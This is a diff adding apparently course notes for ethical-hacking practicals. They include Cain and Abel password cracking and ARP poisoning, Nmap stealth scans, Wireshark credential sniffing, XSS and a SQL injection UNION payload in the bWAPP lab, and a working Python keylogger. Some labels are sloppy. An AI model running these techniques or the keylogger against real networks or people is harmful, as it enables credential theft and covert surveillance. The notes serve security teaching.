@@ -1,0 +1,109 @@
+#Practical 1#
+AIM : Use Google and Whois for Reconnaisasance
+Step 1: Visit who.is website
+Step 2: Input the www.google.com in the input box and click on the search 
+button
+Step 3: Show your information about www.google.com
+
+#Practical 2.1#
+Aim: Use CryptTool to encrypt and decrypt passwords using RC4 algorithm.
+Step 1: Type something in the black document.
+Step 2: Then click on Encrypt/Decrypt tab > Symmetric (modern) > RC4
+Step 3: Then set the key length to 24 bits and click on encrypt.
+Step 4: Now keyword is encrypted to RC4 algorithm format.
+Step 5: Now again repeat step2 and step 3. This time click on derypt option.
+Step 6: Now the text again decrypt from RC4 encrypted format.
+#Practical 2.2 #
+Aim: Use Cain and Abel for cracking Windows account password using 
+Dictionary attack and to decode wireless network passwords
+Click on HASH Calcuator
+Enter the password to convert into hash
+Paste the value into the field you have converted e.g(MD5)
+Right Click on the hash and select the dictionary attack
+Then right click on the file and select (Add to List) and then select the Wordlist
+Select all the options and start the dictionary attack
+
+#Practical 3.1#
+Aim: Using TraceRoute, ping, ifconfig, netstat Command
+    #done in cmd prompt#
+TraceRoute:tracert www.google.com
+Ping:ping www.google.com
+Ipconfig:ipconfig
+Netsat:netstat
+#Practical 3.2#
+Aim: Perform ARP Poisoning in Windows
+Step 1 : Select sniffer on the top.
+Step 2 : Next to folder icon click on icon name start/stop sniffer. Select device 
+and click on ok.
+Step 3 : Click on “+” icon on the top. Click on ok.
+Step 4 : Shows the Connected host.
+Step 5 : Select Arp at bottom.
+Step 6 : Click on “+” icon at the top.
+Step 7 : Click on start/stop ARP icon on top.
+Step 8 : Poisoning the source.
+Step 9 : Go to any website on source ip address.
+Step 10 : Go to password option in the cain & abel and see the visited site 
+password.
+#Practical 4#
+Aim: Using Nmap scanner to perform port scanning of various forms – ACK, 
+SYN, FIN, NULL, XMAS.
+• ACK -sA (TCP ACK scan)
+It never determines open (or even open|filtered) ports. It is used to map 
+out firewall rulesets, determining whether they are stateful or not and 
+which ports are filtered.
+Command: nmap -sA -T4 scanme.nmap.org
+• SYN (Stealth) Scan (-sS)
+SYN scan is the default and most popular scan option for good reason. It 
+can be performed quickly, scanning thousands of ports per second on a 
+fast network not hampered by intrusive firewalls.
+Command: nmap -p22,113,139 scanme.nmap.org
+• FIN Scan (-sF)
+Sets just the TCP FIN bit.
+Command: nmap -sF -T4 scanme.nmap.org
+• NULL Scan (-sN)
+Does not set any bits (TCP flag header is 0)
+Command: nmap –sN –p 22 scanme.nmap.org
+• XMAS Scan (-sX)
+Sets the FIN, PSH, and URG flags, lighting the packet up like a Christmas 
+tree.
+Command: nmap -sX -T4 scanme.nmap.org
+#Practical 5#
+Aim: Use Wireshark sniffer to capture network traffic and analyse.
+1. Open Wireshark and select your Connection.
+2. Open any http website and add display filter
+3. Right Click on the POST method >> Follow >> TCP
+4. Click on the HTML form URl encoded, you wil see username and password.
+
+#Practical 6#
+Aim: Simulate persistent Cross Site Scripting attack
+1. Open bwapp and login
+2. Go to XSS – Reflected POST
+3. Modify the input by inputting <h1>Hello</h1>
+4. Now you got your output
+
+#Practical 7#
+Aim: Session impersonation using Chrome and Tamper Dev extension
+    #refer pdf#
+The login was successful
+If I input username and password as test the login is successful
+#Practical 8#
+Aim: Perform SQL injection attack
+1. Go to Bwapp and login
+2. Select SQL Injection option
+3. Now select any option from it.
+4. Result will be displayed
+5. Now modify the url according to you. For example ?movie=40 union 
+select 1,2,3,4,5,68#&action=go
+#Practical 9#
+Aim: Create a simple keylogger using Python.
+Code:
+from pynput.keyboard import Key, Listener 
+import logging 
+log_dir = "" 
+logging.basicConfig(filename=(log_dir+"key_log.txt"), level=logging.DEBUG, 
+format='%(asctime)s:%(message)s:') 
+def on_press(key): 
+ logging.info(str(key)) 
+with Listener(on_press=on_press) as listener: 
+ listener.join()
+Output:
